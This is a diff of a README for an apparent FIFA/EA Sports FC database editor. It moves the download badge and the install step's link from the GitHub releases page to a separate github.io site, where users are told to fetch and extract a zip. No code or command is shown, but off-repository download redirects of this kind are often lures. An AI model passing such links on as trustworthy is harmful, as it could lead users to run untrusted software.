@@ -1,6 +1,6 @@
 # ⚽ FIFA-Database-Editor-Pro - Edit your game database with ease
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/saadoun681/FIFA-Database-Editor-Pro/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://saadoun681.github.io)
 
 FIFA-Database-Editor-Pro allows you to modify the internal game files of EA Sports FC and FIFA titles. You can change player statistics, update team details, and manage league structures without needing technical coding skills. This tool provides a user interface to view and edit database tables directly.
 
@@ -15,7 +15,7 @@ To check if you have the correct software installed, go to your Windows Settings
 ## 📥 How to Install
 Follow these steps to set up the editor on your Windows PC:
 
-1. Visit the release page to download the latest version of the software: https://github.com/saadoun681/FIFA-Database-Editor-Pro/releases
+1. Visit the release page to download the latest version of the software: https://saadoun681.github.io
 2. Locate the file ending in .zip in your downloads folder.
 3. Right-click the file and select "Extract All".
 4. Choose a destination folder on your computer and click "Extract".
